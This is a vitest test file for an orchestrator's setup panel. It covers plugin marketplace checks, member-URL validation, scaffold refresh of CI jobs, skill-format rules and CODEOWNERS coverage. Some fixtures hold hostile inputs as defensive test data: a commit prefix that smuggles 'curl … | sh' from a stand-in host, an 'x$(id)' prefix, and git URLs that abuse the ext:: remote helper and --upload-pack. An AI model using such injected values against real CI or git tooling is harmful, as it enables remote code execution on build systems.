import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { seed } from "../demo/seed.js";
import { mirrorDir, syncRepo } from "./app.js";
import type { OrchestratorContext } from "./app.js";
import { readInventory } from "./inventory.js";
import { skeletonFiles, TEAM_PREFIX_FILE } from "./plugin.js";
import { refreshScaffold } from "./tasks/scaffold.js";
import { ORCHESTRATOR_RELEASE, joinMessage, parseMemberUrl, scaffoldRefresh, setupFindings, skillFormatProblems } from "./setup.js";
import type { SetupInput } from "./setup.js";
import { git } from "./git.js";
import { openSqliteStore } from "./store.js";

const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

const README = "# Payments\n\n<!-- teamhandbook:begin -->\nJoin with /handbook:join.\n<!-- teamhandbook:end -->\n";

/** A repository set up by this orchestrator's TeamHandbook, with nothing wrong; each case changes one thing. */
function healthy(change: Partial<SetupInput> = {}): SetupInput {
  return {
    plugin: { name: "payments-skills" },
    marketplace: { name: "payments", owner: "Payments", plugins: ["payments-skills"] },
    team: { commitPrefix: "PAY", branchExample: "team/fix-login", reviewers: ["ada"], labels: ["skills"], scaffoldVersion: ORCHESTRATOR_RELEASE },
    readme: README,
    paths: new Set(["hooks", "hooks/hooks.json", "skills"]),
    ...change,
  };
}

const levels = (input: SetupInput) => setupFindings(input).map((f) => `${f.level}: ${f.title}`);

describe("the setup panel", () => {
  it("given a repository set up by this orchestrator's TeamHandbook, when its setup is read, then every finding is fine and says what it is", () => {
    expect(levels(healthy())).toEqual([
      "ok: Teammates can install it",
      "ok: Changes follow the team's naming",
      "ok: Up to date",
      "ok: Every merge reaches teammates",
    ]);
    expect(setupFindings(healthy())[0]).toMatchObject({ title: "Teammates can install it", more: "Marketplace payments, owned by Payments; plugin payments-skills." });
    expect(setupFindings(healthy())[0]).not.toHaveProperty("detail");
  });

  it.each([
    ["no marketplace", { marketplace: { plugins: [] } }, "problem: Teammates cannot join yet"],
    ["a marketplace name join refuses", { marketplace: { name: "Payments Team", plugins: ["payments-skills"] } }, "problem: Teammates cannot join"],
    ["a plugin the marketplace does not list", { marketplace: { name: "payments", plugins: ["other"] } }, "problem: Teammates cannot install the plugin"],
    ["no team file", { team: null }, "attention: No .teamhandbook.json"],
    ["a team file that is not an object", { team: { problem: ".teamhandbook.json is not a JSON object" } }, "problem: .teamhandbook.json cannot be read"],
    ["a commit prefix the plugin's rule refuses", { team: { commitPrefixProblem: "carrying a control character", scaffoldVersion: ORCHESTRATOR_RELEASE } }, "problem: The commit prefix is not used"],
    ["a reviewer the rule drops", { team: { reviewers: ["ada", "not a login!"], scaffoldVersion: ORCHESTRATOR_RELEASE } }, "attention: Some reviewers or labels are left off requests"],
    ["no recorded scaffold version", { team: { commitPrefix: "PAY" } }, "attention: The age of TeamHandbook's files is not known"],
    ["a scaffold from an older release", { team: { scaffoldVersion: "0.1.0" } }, "attention: TeamHandbook's files are out of date"],
    ["a scaffold from a newer release", { team: { scaffoldVersion: "999.0.0" } }, "attention: TeamHandbook's files are newer than this orchestrator"],
    ["no README", { readme: null }, "attention: No README.md"],
    ["a README without the TeamHandbook section", { readme: "# Payments\n" }, "attention: The README has no TeamHandbook section"],
    ["no hooks", { paths: new Set<string>() }, "attention: Teammates are not told when new skills arrive"],
    ["a version raised by CI", { plugin: { name: "payments-skills", version: "0.1.5" }, paths: new Set(["hooks/hooks.json", "scripts/bump-version.mjs"]) }, "ok: Each merge raises the version"],
  ])("given %s, when its setup is read, then the panel says so", (_label, change, finding) => {
    expect(levels(healthy(change as Partial<SetupInput>))).toContain(finding);
  });

  it("given a finding that needs doing, when it is read, then it says what to do next", () => {
    const behind = setupFindings(healthy({ team: { scaffoldVersion: "0.1.0" } })).find((f) => f.title === "TeamHandbook's files are out of date")!;
    expect(behind.detail).toBe(`They were written by TeamHandbook 0.1.0; this orchestrator carries ${ORCHESTRATOR_RELEASE}.`);
    expect(behind.next).toContain("/handbook:init --upgrade");
    const dropped = setupFindings(healthy({ team: { reviewers: ["ada", "not a login!"], scaffoldVersion: ORCHESTRATOR_RELEASE } })).find((f) => f.title.startsWith("Some reviewers"))!;
    expect(dropped.detail).toBe("The plugin's rule drops reviewers not a login!.");
  });

  it("given the demo's repository, read from its mirror, when the inventory is read, then the setup panel is part of it, finds nothing wrong and suggests code owners", async () => {
    // given
    const root = mkdtempSync(join(tmpdir(), "orchestrator-setup-"));
    dirs.push(root);
    const { configFile } = seed(join(root, "demo"));
    const config = JSON.parse(readFileSync(configFile, "utf8"));
    const ctx: OrchestratorContext = { store: openSqliteStore(":memory:"), dataDir: join(root, "data"), tenant: config.tenant };
    await ctx.store.upsertRepo({ ...config.repos[0], tenant: config.tenant });
    await syncRepo(ctx, config.repos[0].id);

    // when
    const inventory = await readInventory(mirrorDir(ctx, config.repos[0].id));

    // then
    expect(inventory.setup.filter((f) => f.level === "attention" || f.level === "problem")).toEqual([]);
    expect(inventory.setup.filter((f) => f.level === "suggestion").map((f) => f.title)).toEqual(["No one is asked to review skill and server changes"]);
    expect(inventory.setup.map((f) => f.title)).toContain("Up to date");
  });
});

describe("the address teammates join by", () => {
  it.each([
    ["an https address", "https://git.example.invalid/acme/payments-skills.git"],
    ["an ssh address", "git@git.example.invalid:acme/payments-skills.git"],
    ["an ssh URL with its user", "ssh://git@git.example.invalid/acme/payments-skills.git"],
    ["a local repository", "file:///srv/git/payments-skills.git"],
  ])("given %s, when the configuration is read, then it is taken as it is", (_label, url) => {
    expect(parseMemberUrl(url, "payments-skills")).toBe(url);
  });

  it("given no memberUrl, when the configuration is read, then there is none and nothing stands in for it", () => {
    expect(parseMemberUrl(undefined, "payments-skills")).toBeNull();
  });

  it.each([
    ["a user and password", "https://ada:hunter2-secret@git.example.invalid/acme/payments-skills.git", /carries a credential/],
    ["a token as the user", "https://ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/acme/payments-skills.git", /carries a credential/],
    ["a token anywhere else", "https://git.example.invalid/acme/payments-skills.git?private_token=glpat-abcdefghij0123456789", /carries a credential/],
    ["a remote helper", "ext::sh%20-c%20touch%20pwned", /not a git URL/],
    ["an option in place of a URL", "--upload-pack=touch", /not a git URL/],
    ["a space at the end", "https://git.example.invalid/acme/payments-skills.git ", /without spaces/],
    ["something that is not text", 42, /must be a git URL/],
  ])("given %s, when the configuration is read, then the orchestrator stops and the message does not repeat it", (_label, value, reason) => {
    // when
    const read = () => parseMemberUrl(value, "payments-skills");

    // then
    expect(read).toThrow(reason);
    expect(read).toThrow(/memberUrl of payments-skills/);
    if (typeof value === "string") expect(() => read()).not.toThrow(value);
  });
});

describe("the join message", () => {
  const url = "https://git.example.invalid/acme/payments-skills.git";
  const plugin = { name: "payments-skills" };
  const marketplace = { name: "payments", plugins: ["payments-skills"] };

  it("given a repository teammates can install from and its address, when the message is made, then it names the address, the plugin at its marketplace and the join command", () => {
    expect(joinMessage(url, plugin, marketplace)).toEqual({
      url,
      use: [`/plugin marketplace add ${url}`, "/plugin install payments-skills@payments"],
      contribute: `/handbook:join ${url}`,
    });
  });

  it("given no address in the configuration, when the message is made, then it says where to set one", () => {
    expect(joinMessage(null, plugin, marketplace)).toEqual({ problem: expect.stringContaining("Set memberUrl") });
  });

  it.each([
    ["no marketplace", { plugins: [] }],
    ["a marketplace name join refuses", { name: "Payments Team", plugins: ["payments-skills"] }],
    ["a marketplace that does not list the plugin", { name: "payments", plugins: ["other"] }],
  ])("given %s, when the message is made, then no command is offered and the setup panel is pointed to", (_label, broken) => {
    expect(joinMessage(url, plugin, broken)).toEqual({ problem: expect.stringContaining("under Setup") });
  });
});

describe("refreshing the scaffold from the page", () => {
  it("given findings a refresh fixes and ones it does not, when the setup is read, then only the first are marked for the refresh", () => {
    // given
    const behind = healthy({ team: { scaffoldVersion: "0.1.0" }, readme: null, paths: new Set<string>() });
    const newer = healthy({ team: { scaffoldVersion: "999.0.0" }, marketplace: { name: "payments", plugins: ["other"] } });

    // when
    const marked = (input: SetupInput) => setupFindings(input).filter((f) => f.refresh).map((f) => f.title);

    // then
    expect(marked(behind)).toEqual(["TeamHandbook's files are out of date", "No README.md", "Teammates are not told when new skills arrive"]);
    expect(marked(newer)).toEqual([]);
    expect(marked(healthy())).toEqual([]);
    expect(setupFindings(behind).find((f) => f.refresh)!.next).toMatch(/^Update TeamHandbook's files from this page, .* or run \/handbook:init --upgrade from a teammate's machine/);
    expect(setupFindings(behind).find((f) => f.refresh)!.more).toContain("leaves skills, commands and .mcp.json alone");
  });

  it.each([
    ["an orchestrator that runs tasks and the repository's memberUrl", { tasks: true, configured: true, memberUrl: "https://git.example.invalid/acme/p.git" }, { available: true }],
    ["an orchestrator that runs no tasks", { tasks: false, configured: true, memberUrl: "https://git.example.invalid/acme/p.git" }, { problem: expect.stringContaining("runs no tasks") }],
    ["a repository out of the configuration", { tasks: true, configured: false, memberUrl: "https://git.example.invalid/acme/p.git" }, { problem: expect.stringContaining("no longer in the orchestrator's configuration") }],
    ["no memberUrl", { tasks: true, configured: true, memberUrl: null }, { problem: expect.stringContaining("set memberUrl for it") }],
  ])("given %s, when the page asks whether it refreshes the scaffold, then it says so", (_label, input, answer) => {
    expect(scaffoldRefresh(input)).toEqual(answer);
  });

  it("given a CI repository whose team file records a prefix that would run a command, when the orchestrator refreshes its scaffold, then the CI job is left as it was and says why", async () => {
    // given
    const work = mkdtempSync(join(tmpdir(), "orchestrator-setup-refresh-"));
    dirs.push(work);
    const files = skeletonFiles("payments", "https://git.example.invalid/acme/payments.git", "gitlab.example.invalid", "", true, undefined, {}, "0.1.0", "0.1.3");
    const team = { ...JSON.parse(files[TEAM_PREFIX_FILE]!), commitPrefix: 'VAN-7 $(curl -s evil.example.invalid|sh)" && echo "' };
    for (const [path, content] of Object.entries({ ...files, [TEAM_PREFIX_FILE]: JSON.stringify(team, null, 2) + "\n" })) {
      mkdirSync(dirname(join(work, path)), { recursive: true });
      writeFileSync(join(work, path), content);
    }
    const ci = readFileSync(join(work, ".gitlab-ci.yml"), "utf8");

    // when
    const refreshed = await refreshScaffold(work, "https://git.example.invalid/acme/payments.git", { kind: "scaffold.refresh", commitVersioning: false });

    // then
    expect(readFileSync(join(work, ".gitlab-ci.yml"), "utf8")).toBe(ci);
    expect(ci).not.toContain("curl");
    const said = "warnings" in refreshed ? refreshed.warnings.join("\n") : refreshed.refused;
    expect(said).toContain(".gitlab-ci.yml is left as it is: it embeds the team's commit-message prefix, and the one .teamhandbook.json records is carrying a character other than");
    expect(said).not.toContain("curl");
  });

  it("given a CI repository running the job written with the prefix in its shell line, when the orchestrator refreshes its scaffold, then the job is rewritten with the prefix only in BUMP_MESSAGE", async () => {
    // given
    const work = mkdtempSync(join(tmpdir(), "orchestrator-setup-refresh-"));
    dirs.push(work);
    const files = skeletonFiles("payments", "https://git.example.invalid/acme/payments.git", "gitlab.example.invalid", "PAY", true, undefined, {}, "0.1.0", "0.1.3");
    const old = files[".gitlab-ci.yml"]!.replace('    BUMP_MESSAGE: "PAY ci: bump plugin version"\n', "").replace('"$BUMP_MESSAGE"', '"PAY ci: bump plugin version"');
    for (const [path, content] of Object.entries({ ...files, ".gitlab-ci.yml": old })) {
      mkdirSync(dirname(join(work, path)), { recursive: true });
      writeFileSync(join(work, path), content);
    }

    // when
    const refreshed = await refreshScaffold(work, "https://git.example.invalid/acme/payments.git", { kind: "scaffold.refresh", commitVersioning: false });

    // then
    expect("summary" in refreshed && refreshed.summary).toContain(".gitlab-ci.yml");
    const ci = readFileSync(join(work, ".gitlab-ci.yml"), "utf8");
    expect(ci.split("\n").filter((line) => line.includes("PAY")).map((line) => line.trim())).toEqual(['BUMP_MESSAGE: "PAY ci: bump plugin version"']);
  });
});

const FORMED = [
  "---",
  "name: release-checklist",
  "description: Use when a payments release is about to ship. Use when someone asks whether the service is ready to deploy.",
  "---",
  "",
  "## 1. Freeze the branch",
  "",
  "Stop merging into main.",
  "",
  "## 2. Run the checks",
  "",
  "Run the release checks and read every result.",
  "",
  "## 3. Tag the release",
  "",
  "Tag main with the next version.",
  "",
  "## Verify",
  "",
  "- The tag exists on the forge.",
  "- The deploy dashboard shows the new version.",
  "",
  "## Pitfalls",
  "",
  "- Tagging before the checks pass ships a broken build.",
  "",
].join("\n");

describe("a skill held to the plugin's format", () => {
  it("given a skill written the way /handbook:learn drafts one, when it is checked, then nothing is reported", () => {
    expect(skillFormatProblems(FORMED)).toEqual([]);
  });

  it("given a skill with one trigger sentence, no numbered steps and an absolute path, when it is checked, then each rule it fails is said in a sentence and the path is not repeated", () => {
    // given
    const loose = "---\nname: release-checklist\ndescription: Release things.\n---\n\nRun /home/someone/release.sh and ship.\n";

    // when
    const problems = skillFormatProblems(loose);

    // then
    expect(problems).toContain("the description gives fewer than 2 sentences saying when to use it, so Claude has little to recognise it by");
    expect(problems).toContain("it has fewer than 3 numbered steps, or a numbered heading with nothing under it");
    expect(problems).toContain("it names an absolute path of one machine");
    expect(JSON.stringify(problems)).not.toContain("/home/someone");
  });

  it("given a skill without frontmatter, when it is checked, then the first thing said is that it has none", () => {
    expect(skillFormatProblems("Just text.\n")[0]).toBe("SKILL.md has no frontmatter between --- markers");
  });
});

describe("the version line coming back", () => {
  it("given a repository whose version line a commit put back after the switch to versioning by commit, when its setup is read, then the panel names the commit, its author and the way back", () => {
    // given
    const input = healthy({ plugin: { name: "payments-skills", version: "0.1.5" }, versionBack: { sha: "c0ffee1234567", author: "Old Teammate", date: "2026-10-20T09:00:00+02:00", version: "0.1.5" } });

    // when
    const finding = setupFindings(input).find((f) => f.title === "The version line came back");

    // then
    expect(finding?.level).toBe("attention");
    expect(finding?.detail).toContain("c0ffee1 by Old Teammate on 2026-10-20 put version 0.1.5 back into .claude-plugin/plugin.json");
    expect(finding?.next).toContain("Switch the plugin to versioning by commit");
    expect(levels(input)).not.toContain("ok: Each request raises the version");
  });
});

describe("a version-bump job written the old way", () => {
  const oldJob = (prefix: string) => `version-bump:\n  script:\n    - node scripts/bump-version.mjs\n    - git commit -am "${prefix} ci: bump plugin version"\n`;
  const currentJob = `version-bump:\n  variables:\n    BUMP_MESSAGE: "PAY ci: bump plugin version"\n  script:\n    - git commit -am "$BUMP_MESSAGE"\n`;
  const withJob = (ciJob: string, team: SetupInput["team"], also: string[] = []) => healthy({ team, ciJobs: [...also, ciJob], paths: new Set(["hooks/hooks.json", "scripts/bump-version.mjs", ".gitlab-ci.yml"]) });

  it("given the old job and a recorded prefix the rule refuses, when the setup is read, then it is a problem that names the token it runs with and the way out, without the prefix", () => {
    // given
    const input = withJob(oldJob('VAN-7 $(curl -s evil.example.invalid|sh)" && echo "'), { commitPrefixProblem: "carrying a character other than letters, digits, spaces and . , : / [ ] ( ) _ -", scaffoldVersion: ORCHESTRATOR_RELEASE });

    // when
    const finding = setupFindings(input).find((f) => f.title === "The CI job runs a refused commit prefix");

    // then
    expect(finding?.level).toBe("problem");
    expect(finding?.detail).toContain("with TEAMHANDBOOK_CI_TOKEN, which writes to this repository");
    expect(finding?.next).toContain('/handbook:init --upgrade --commit-prefix "<the prefix the forge requires>"');
    expect(finding?.refresh).toBeUndefined();
    expect(JSON.stringify(setupFindings(input))).not.toContain("curl");
  });

  it("given the old job and a prefix the rule takes, when the setup is read, then the refresh that rewrites it is offered", () => {
    const finding = setupFindings(withJob(oldJob("PAY"), { commitPrefix: "PAY", scaffoldVersion: ORCHESTRATOR_RELEASE })).find((f) => f.title === "The CI job is written the old way");
    expect(finding).toMatchObject({ level: "attention", refresh: true });
  });

  it("given the demo's repository with the old job and a prefix that would run a command, when its inventory is read, then the setup panel has the problem", async () => {
    // given
    const root = mkdtempSync(join(tmpdir(), "orchestrator-setup-ci-"));
    dirs.push(root);
    const { configFile } = seed(join(root, "demo"));
    const config = JSON.parse(readFileSync(configFile, "utf8"));
    const ctx: OrchestratorContext = { store: openSqliteStore(":memory:"), dataDir: join(root, "data"), tenant: config.tenant };
    const entry = config.repos[0];
    await ctx.store.upsertRepo({ ...entry, tenant: config.tenant });
    const bare = entry.url.replace("file://", "");
    const work = join(root, "work");
    git(["clone", "--quiet", bare, work], root);
    const bad = 'VAN-7 $(curl -s evil.example.invalid|sh)" && echo "';
    const team = JSON.parse(readFileSync(join(work, TEAM_PREFIX_FILE), "utf8"));
    writeFileSync(join(work, TEAM_PREFIX_FILE), JSON.stringify({ ...team, commitPrefix: bad }, null, 2) + "\n");
    mkdirSync(join(work, "scripts"), { recursive: true });
    writeFileSync(join(work, "scripts", "bump-version.mjs"), "// raises the version\n");
    writeFileSync(join(work, ".gitlab-ci.yml"), oldJob(bad));
    git(["add", "-A"], work);
    git(["-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "chore: an old job"], work);
    git(["fetch", "--quiet", work, "main:main"], bare);
    await syncRepo(ctx, entry.id);

    // when
    const inventory = await readInventory(mirrorDir(ctx, entry.id));

    // then
    expect(inventory.setup.map((f) => `${f.level}: ${f.title}`)).toContain("problem: The CI job runs a refused commit prefix");
  });

  it("given a current GitLab job beside an old GitHub workflow carrying a refused prefix, when the setup is read, then the old one is still the problem", () => {
    const input = withJob(oldJob("x$(id)"), { commitPrefixProblem: "carrying a character other than letters, digits, spaces and . , : / [ ] ( ) _ -", scaffoldVersion: ORCHESTRATOR_RELEASE }, [currentJob]);
    expect(levels(input)).toContain("problem: The CI job runs a refused commit prefix");
  });

  it("given the job as TeamHandbook writes it today, when the setup is read, then nothing is said about it", () => {
    expect(levels(withJob(currentJob, { commitPrefix: "PAY", scaffoldVersion: ORCHESTRATOR_RELEASE })).filter((l) => l.includes("CI job"))).toEqual([]);
  });
});

describe("who owns the agent configuration", () => {
  const owners = (text: string, path = "CODEOWNERS") => setupFindings(healthy({ codeowners: { path, text } })).find((f) => f.title.includes("review"))!;

  it("given no CODEOWNERS, when the setup is read, then it says nobody owns the agent configuration and gives the lines to add", () => {
    // when
    const finding = setupFindings(healthy({ codeowners: null })).find((f) => f.title === "No one is asked to review skill and server changes")!;

    // then
    expect(finding.level).toBe("suggestion");
    expect(finding.next).toBe("Name the team that reviews them in a CODEOWNERS file.");
    expect(finding.more).toContain("/skills/ @your-org/your-team; /.mcp.json @your-org/your-team; /hooks/ @your-org/your-team; /.claude-plugin/ @your-org/your-team; /.teamhandbook.json @your-org/your-team");
  });

  it.each([
    ["one rule for everything", "* @acme/platform\n"],
    ["a rule per path", "/skills/ @acme/skills\n/.mcp.json @acme/platform\nhooks/ @acme/platform\n.claude-plugin @acme/platform\n/.teamhandbook.json lead@example.invalid\n"],
    ["globs across folders and a GitLab section", "[Agents]\n**/SKILL.md @acme/skills\n/*.json @acme/platform\n/hooks/** @acme/platform\n/.claude-plugin/*.json @acme/platform\n"],
  ])("given %s, when the setup is read, then every agent path has an owner", (_label, text) => {
    expect(owners(text)).toMatchObject({ level: "ok", title: "Skill and server changes have reviewers" });
  });

  it("given owners for the code and a later rule that takes skills back, when the setup is read, then it names the unowned paths and only those, since the last matching rule decides", () => {
    // when
    const finding = owners("# owners\n* @acme/platform\n/skills/\n/src/ @acme/backend\n", ".github/CODEOWNERS");

    // then
    expect(finding).toMatchObject({ level: "suggestion", title: "Some skill and server changes have no reviewer" });
    expect(finding.detail).toBe(".github/CODEOWNERS names no owner for skills/, so a change there is merged with the approval any change needs.");
    expect(finding.more).toContain("Add to .github/CODEOWNERS: /skills/ @your-org/your-team.");
  });

  it("given a rule for a folder of the same name deeper down, when the setup is read, then it does not stand for the root's", () => {
    expect(owners("/docs/skills/ @acme/docs\n/.mcp.json @a\n/hooks/ @a\n/.claude-plugin/ @a\n/.teamhandbook.json @a\n").detail).toContain("names no owner for skills/");
  });

  it("given a repository with CODEOWNERS in .gitlab/ and an unrelated one in docs/, when its inventory is read, then the one the forge reads first is used", async () => {
    // given
    const root = mkdtempSync(join(tmpdir(), "orchestrator-setup-owners-"));
    dirs.push(root);
    const { configFile } = seed(join(root, "demo"));
    const config = JSON.parse(readFileSync(configFile, "utf8"));
    const ctx: OrchestratorContext = { store: openSqliteStore(":memory:"), dataDir: join(root, "data"), tenant: config.tenant };
    await ctx.store.upsertRepo({ ...config.repos[0], tenant: config.tenant });
    const bare = config.repos[0].url.replace(/^file:\/\//, "");
    const work = mkdtempSync(join(root, "work-"));
    git(["clone", "--quiet", bare, work], work);
    mkdirSync(join(work, ".gitlab"));
    mkdirSync(join(work, "docs"), { recursive: true });
    writeFileSync(join(work, "docs", "CODEOWNERS"), "/src/ @acme/backend\n");
    writeFileSync(join(work, ".gitlab", "CODEOWNERS"), "* @acme/platform\n");
    git(["add", "-A"], work);
    git(["-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "chore: owners"], work);
    git(["fetch", "--quiet", work, "main:main"], bare);
    await syncRepo(ctx, config.repos[0].id);

    // when
    const inventory = await readInventory(mirrorDir(ctx, config.repos[0].id));

    // then
    expect(inventory.setup.find((f) => f.title.includes("review"))).toMatchObject({ level: "suggestion", detail: expect.stringContaining("docs/CODEOWNERS names no owner for skills/, .mcp.json, hooks/, .claude-plugin/, .teamhandbook.json") });
  });
});
